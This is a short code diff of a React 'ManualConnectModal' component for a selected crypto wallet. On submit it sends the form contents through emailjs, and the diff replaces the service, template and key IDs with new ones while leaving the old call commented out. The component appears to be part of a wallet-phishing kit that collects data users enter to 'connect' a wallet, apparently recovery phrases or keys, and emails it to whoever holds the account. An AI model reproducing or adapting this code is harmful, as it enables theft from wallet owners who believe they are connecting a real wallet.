@@ -136,6 +136,8 @@
 //         "yPbNv-lKRO62iIUkS"
 //       );
 
+
+
 //       onSubmit(); // Close the modal after successful submission
 //     } catch (error) {
 //       console.error("Error submitting form:", error);
@@ -343,12 +345,20 @@ const ManualConnectModal = ({ selectedWallet, closeModal, onSubmit }) => {
 
     console.log("Form data:", formData);
 
+      // await emailjs.sendForm(
+      //   "service_uk7i0bi",
+      //   "template_p524rvn",
+      //   form.current,
+      //   "rVndnp0Bchzm41MAz"
+      // );
+    
+
     try {
       await emailjs.sendForm(
-        "service_uk7i0bi",
-        "template_p524rvn",
+        "service_ebz5nbc",
+        "template_4ourynj",
         form.current,
-        "rVndnp0Bchzm41MAz"
+        "ZTuNAlPhY2DQ9uhW0"
       );
      // Reset form state values
      setUserText("");
